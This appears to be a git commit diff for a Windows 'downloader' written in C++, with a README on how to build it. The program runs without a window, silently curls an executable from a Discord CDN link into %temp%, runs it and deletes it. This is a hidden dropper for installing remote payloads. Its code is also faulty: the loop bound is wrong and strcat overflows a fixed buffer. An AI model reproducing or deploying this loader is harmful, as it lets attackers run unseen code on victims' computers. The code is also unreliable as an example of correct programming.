26bd34b2b0067bee39000e3bb5be8e0f6acb80f9
aydyn#0001 <aydynsiraci@gmail.com>
2022-04-29 16:15:44 -0400

    easier to use now

---
+++ README.md
@@ -0,0 +1,8 @@
+# downloader
+
+## how to use
+1. add the download links to your files
+2. to change the download location change %temp% to the path you want
+
+no builder, you need visual studio installed to compile this  
+compile using `cl main.cpp /Os`
--- main.cpp
+++ main.cpp
@@ -1,8 +1,26 @@
-#include <windows.h>
-#pragma comment(lib,"minicrt.lib")
+#include <Windows.h>
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
+char *links[] = {
+    "https://cdn.discordapp.com/attachments/950546791596695583/969650516302905364/hwgui.exe"
+};
+char *installFolder = "%temp%\\";
+
 int main () {
-    WinExec("cmd.exe /c @echo off && curl https://cdn.discordapp.com/attachments/950546791596695583/969650516302905364/hwgui.exe -o %temp%\\downloaded.exe -s && %temp%\\downloaded.exe && del %temp%\\downloaded.exe", SW_HIDE);
+    for (int i = 0; i < sizeof(links); i++) {
+        char *fileName = strrchr(links[i], '/') + 1;
+        char cmd[] = "cmd.exe /c @echo off && curl ";
+        strcat(cmd, links[i]);
+        strcat(cmd, " -s -o ");
+        strcat(cmd, installFolder);
+        strcat(cmd, fileName);
+        strcat(cmd, " && ");
+        strcat(cmd, installFolder);
+        strcat(cmd, fileName);
+        strcat(cmd, " && del ");
+        strcat(cmd, installFolder);
+        strcat(cmd, fileName);
+        WinExec(cmd, SW_HIDE);
+    }
     return 0;
 }
